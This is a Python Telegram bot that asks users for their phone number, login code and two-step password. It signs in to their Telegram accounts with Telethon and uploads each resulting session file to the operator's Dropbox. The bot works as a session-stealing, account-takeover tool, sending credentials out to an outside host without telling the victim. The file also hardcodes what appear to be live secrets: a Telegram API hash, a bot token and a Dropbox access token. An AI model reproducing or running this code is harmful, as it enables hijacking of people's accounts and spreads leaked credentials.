import os
import asyncio
import dropbox
from telethon import TelegramClient, errors
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN = "sl.u.AFvSPFAAwVZ_VUfjx3mngTAlIlTkLrXx6Q7H2k7g0S-cIr56MoZgMctmggWMyZDqL5lVapNQy7FEs7c-BdtkzLhfNcB-TZIig3Pj9GmjHMDn5KuyL6sNcncapvw9cSP915aqC1gMkUuf_nurV7BjCBySeM_f5nvKUbejNLG-MLULApTftRrrTZVkY2Fbr74pdA12XCvey6lhdufkiFEMGsWTtK00Gjkr-H8nNRTgOGs22mecJMUcL1visNhr7-PQW7eA7JVeLb2s8pjdFlhFLtp4ewGboRIFs5m_9CCsH7z0I-A8qmoxf383tXlMJFmYqY-4LpTHBhOxOg4D8-f9Hwu6p20AgePRM7fSFpkxYbPeTWdm0s9_WkTSQOk-m0d3Em85e7togTll9vO_fmOkLEp29xlkKhZcjnEv6uOQGwdxxDQjX1IvoHscwVgLXaEGDCMouanGvSRyOqwc7vjmF24JPnH6gtl3-LaLgm8dDEg010uNWiS_r5of8snnK3QKkQaJF4sNwbrprXdpDsF4RwSP2Nsp2sh4OyM9SkFmVBL82PHNH3MOUJaRLQefhr2VWRcEfBIyU5U5MpW_OW5_OfSAo9CA7RaZRPlXHJ59Hl0st6GzMDNlOFsoMGDqcCNoSdSmYWW4SWLK--PUeND7xbBEWKofbc6PIa-0zuncSdj3GG5cOtPebtPMfBYUymTk1jdsBf7UHxvIRo65iIVxwW9EXF2oCJgcQEqPPp_WtVdFSUX-oeesl6y7tDgfc5gJrI-3E8363Tmva9XEK_O8qQA3fvkNG8PzzLxqK0n27lxrgooQ1TcoTYZKEzbGtvsuiq1hiyzJ3mvsbLD4eL-8oohl5PUSY7RsBi-MVcyJka0baEyTCVk7-78jLlwDm1Q4Hj0RxPgrN6kGFf2qf3-itlpN3KpjiKaDYqxjuJKJ0j9uuRC-4yduhMnzYIOd_uQcdCqoZzNr204VN0qZKN0B_7Kf41ZPLaauSEOWgChg1MZCjczMN92j-mVFNnwxfdAcAjl5y6NHSTTa99TZpuTPiYYUedbD8WjmwJqQEH7FXNJeQKrh5MBs8YxkXr1BtXKq8SDXKGudyb9mq2sgkLMpGqwOz_03MDUlw8XpaAsS2Bd7_bI3SHC0X9TUJAnLoIrh4NSDe69k9-bOj8cN8kwaQ4qjP8-0S0mGQQ61ouzvJjD-kzoDCFECdouPiuG6DLutkMafsx3JNVenQR1YsQnptKPcL53NlXEmtxog356VmuUn1WmfcHLno3VWiuDyHgdHQm0qx1mXe6-gsxh1zeXeXvvgUqZve3lNNyxLL7ip1yMc6nct7A2Essk1Wd_MrtsgfsMPA2c3Iz2s4ewVdE8HP8vWIjkYISFfcb8zKKrQUhL7N1zIbZ4jUakxUdv_W-0MVDUfTCbcD0ZqGkXRXHTyc3_lRiL69g79OC9RwzVgBO0U-iT3xH8t2uKUHTNQH7R762tKwCp_LvMh8HdX6jPmEvyi"  # <-- Replace with your Dropbox access token
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login states ----
user_sessions = {}

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    # Create a new Telethon client for this user
    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_name, API_ID, API_HASH)

    await client.connect()

    try:
        sent = await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")
        
        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, phone)
        
        await client.disconnect()
        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        # If wrong code, offer retry or skip
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE

# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Upload session file to Dropbox
        await upload_session_to_dropbox(client, session["phone"])
        
        await client.disconnect()
        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD

# ---- Upload Session File to Dropbox ----
# ---- Upload Session File to Dropbox ----
async def upload_session_to_dropbox(client, phone):
    """Uploads session file to Dropbox"""
    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        
    print(f"✅ Session file for {phone} uploaded to Dropbox.")


# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
